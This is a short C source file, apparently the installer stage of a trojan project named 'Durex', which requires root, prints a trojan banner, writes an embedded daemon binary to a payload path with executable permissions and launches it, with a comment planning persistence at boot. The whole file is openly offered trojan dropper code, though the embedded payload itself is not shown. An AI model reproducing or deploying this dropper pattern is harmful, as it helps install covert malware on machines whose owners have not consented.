#include "durex.h"

extern unsigned char durex_deamon[];
extern unsigned int durex_deamon_len;

int	main(void)
{
	int	fd;

	if (getuid() != 0)
	{
		dprintf(2, "Root privileges are required to run this program\n");
		return EXIT_FAILURE;
	}
	printf("%s\n", TROJAN_STR);
	fd = open(PAYLOAD_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd < 0)
		return EXIT_SUCCESS;
	write(fd, durex_deamon, durex_deamon_len);
	system(PAYLOAD_PATH);
	// TODO: Make if launched at boot.
	return EXIT_SUCCESS;
}
